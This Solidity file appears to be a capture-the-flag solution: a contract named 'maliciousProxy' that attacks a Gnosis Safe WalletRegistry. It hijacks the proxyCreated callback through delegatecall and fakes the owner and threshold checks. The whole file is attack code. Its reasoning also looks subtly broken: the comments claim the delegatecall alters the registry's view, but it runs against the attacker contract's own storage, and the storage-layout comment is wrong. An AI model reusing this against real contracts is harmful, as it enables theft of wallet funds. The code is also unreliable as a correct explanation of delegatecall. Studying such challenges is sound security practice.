// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis/contracts/GnosisSafe.sol";
import "@gnosis/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title maliciousProxy
 * @notice this contract is used to attack the WalletRegistry contract.
            by using a delegateCall, it will intercept the callback.Proxycreated() function called by the gnosisSafeProxyFactory contract.
            The WalletRegistry will believe its proxyCreated function is called by the gnosisSafeProxyFactory address.
            This is because the msg.sender is "forwarded" to the receiving contract.
            This malicious contract also has the functions called by the WalletRegistry to check the ownership of the wallet.
 * @dev 
 * @author @trx314
 */

 contract maliciousProxy {

    //  keep the same storage structure as the receiving contract
    uint256 private constant MAX_OWNERS = 1;
    uint256 private constant MAX_THRESHOLD = 1;
    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18
    
    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;
    address public immutable walletOwner;
    address public immutable walletRegistry;

    // owner => wallet
    mapping (address => address) public wallets;

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress, 
        address tokenAddress, 
        address walletOwnerAddress,
        address walletRegistryAddress
    ) {
        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);
        walletOwner = walletOwnerAddress;
        walletRegistry = walletRegistryAddress;
    }

    // function called by the proxyfactory
    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes memory initializer,
        uint256 saltnonce
    ) external returns(bytes4){
        // substitute the right proxy address by the present malicious proxy
        address fake_proxy = address(this);
        // build a fake initializer with data expected by the registry
        bytes4 fake_initializer = GnosisSafe.setup.selector;
        // delegatecall the registry contract with fake proxy address information
        // because it is a delegate call, the msg.sender will be the real factory contract instead of the present malicious contract
        bytes memory data = abi.encodeWithSignature("proxyCreated(GnosisSafeProxy,address,bytes,uint256)",fake_proxy,singleton,fake_initializer,saltnonce);
        (bool success, bytes memory return_data) = walletRegistry.delegatecall(data);
        return fake_initializer;
    }

    // return the expected value for the threshold of signatures
    function getThreshold() external returns(uint256) {
        return 1;
    }
    
    // return the expected owner of the wallet and expected owner length (=1)
    function getOwners() external returns(address[] memory) {
        address[] memory owners = new address[](1);
        owners[0] = walletOwner;
        return owners;
    }

 }